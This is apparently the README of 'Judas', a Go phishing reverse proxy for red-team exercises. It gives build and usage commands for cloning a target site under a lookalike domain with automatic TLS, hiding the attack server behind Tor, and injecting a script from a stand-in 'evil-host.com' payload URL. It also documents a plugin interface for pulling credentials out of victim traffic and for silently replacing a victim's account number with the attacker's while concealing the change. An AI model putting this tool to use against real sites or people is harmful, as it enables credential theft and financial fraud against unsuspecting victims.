Judas
=====
Judas is a pluggable phishing proxy.
It can clone any website passed to it using command line flags, and you can extend it with Go plugins for fun and (legal) profit.
Judas is meant to be used in red team phishing exercises to phish victims without them being able to notice.
When combined with effective typosquatting, Judas is unstoppable.

```
Usage of judas:
  -address string
        Address and port to run proxy service on. Format address:port. (default "localhost:8080")
  -inject-js string
        URL to a JavaScript file you want injected.
  -insecure
        Listen without TLS.
  -insecure-target
        Not verify SSL certificate from target host.
  -plugins string
        Colon separated file path to plugin binaries.
  -proxy string
        Optional upstream SOCKS5 proxy. Useful for torification.
  -proxy-ca-cert string
        Proxy CA cert for signed requests
  -ssl-hostname string
        Hostname for SSL certificate
  -target string
        The website we want to phish.
  -with-profiler
        Attach profiler to instance.
```

Building
--------
To build `judas`, simply run `go build`.
 ```
 go build cmd/judas.go
 ```


Usage
-----
The target ```--target``` flag is required.
`judas` will use Let's Encrypt to automatically create SSL certificates for website, simply pass the `--ssl-hostname` flag.

Example:
```
./judas \
    --target https://target-url.com \
    --ssl-hostname phishingsite.com
```

If you want to listen using HTTP, pass the ```--insecure``` flag.

Example:
```
./judas \
    --target https://target-url.com \
    --insecure
```

If you want to accept self-signed SSL certificate from target host, pass the ```--insecure-target``` flag.
This is useful for passing it through an intercepting proxy like Burp Suite for debugging purposes.

Example:
```
./judas \
    --target https://target-url-with-self-signed-cert.com \
    --proxy http://localhost:8080 \
    --insecure-target
```


It can optionally use an upstream proxy with the ```--proxy``` argument to proxy Tor websites or hide the attack server from the target.
Judas supports SOCKS5 and HTTP proxies.
HTTP proxies must being with `http://` and socks5 proxies must begin with `socks5://`

Example:
```
./judas \
    --target https://torwebsite.onion \
    --ssl-hostname phishingsite.com \
    --proxy socks5://localhost:9150
```

By default, Judas listens on localhost:8080.
To change this, use the ```--address``` argument.

Example:
```
./judas \
    --target https://target-url.com \
    --ssl-hostname phishingsite.com \
    --address=0.0.0.0:8080
```

Judas can also inject custom JavaScript into requests by passing a URL to a JS file with the ```--inject-js``` argument.

Example:
```
./judas \
    --target https://target-url.com \
    --ssl-hostname phishingsite.com \
    --inject-js https://evil-host.com/payload.js
```

Plugins
-------
Judas can be extended using [Go plugins](https://golang.org/pkg/plugin/). 
An `judas` plugin is a regular Go plugin with a function called `New` that implements `judas.InitializerFunc`.
You can use plugins to save request-response transactions to disk for further analysis, or pull credentials and sensitive information out of requests and responses on the fly.
Plugins run in their own goroutine and judas will recover from panics, so you don't need to worry too much about what you do in the plugins.
You should configure your plugins using [environment variables](https://golang.org/pkg/os/#Getenv).

```
// InitializerFunc is a go function that should be exported by a function package.
// It should be named "New".
// Your InitializerFunc should return an instance of your Listener with a reference to judas's logger for consistent logging.
type InitializerFunc func(*log.Logger) (Listener, error)
```

The `judas.Listener` interface has one method: `Listen`.

```
// Listener implementations will be given a stream of HTTPExchanges to let plugins capture valuable information out of request-response transactions.
type Listener interface {
	Listen(<-chan *HTTPExchange)
}
```

`Listen` implementations will receive a stream of  `judas.HTTPExchange`.
These contain the `judas.Request`, the payload and the `judas.Response`, along with the target.

```
// HTTPExchange contains the request sent by the user to us and the response received from the target server.
// Listeners can use this struct to pull information out of requests and responses.
type HTTPExchange struct {
	Request  *Request
	Response *Response
	Target   *url.URL
}
```

Plugins can also modify requests after they come from the victim and responses after they're returned from the server.
This is useful when you want to modify a request on the fly, like replacing an account number with yours.
To take advantage of this, simply create a custom `RequestTransformer` or `ResponseTransformer`.

```
// RequestTransformer modifies a request before it is sent to the target website.
// This can be used to hijack victim actions, like replacing an account number with ours.
// Delays in this function will slow down the phishing site for the victim.
// Your RequestTransformer should be a function called "RequestTransformer"
type RequestTransformer func(*http.Request) error

// ResponseTransformer modifies a response before it is returned to the victim.
// You can use ResponseTransformers to hide any visible results of a RequestTransformer.
// Delays in this function will slow down the phishing site for the victim.
// Your ResponseTransformer should be a function called "ResponseTranformer"
type ResponseTransformer func(*http.Response) error
```

You only have to implement the methods you're using.
You can put compiled plugins in a directory and pass them with the `--plugins` flag.
Plugins are colon separated file paths.

Example:
```
judas \
     --target https://www.google.com \
     --insecure \
     --address localhost:9000 \
     --proxy http://localhost:8080 \
     --insecure-target \
     --plugins ./searchloggingplugin.so:./linksloggingplugin.so
```

See [examples/searchloggingplugin/searchloggingplugin.go](https://github.com/JonCooperWorks/judas/tree/master/examples/searchloggingplugin/searchloggingplugin.go)

You can build a plugin using this command:
```
go build -buildmode=plugin examples/searchloggingplugin/searchloggingplugin.go
```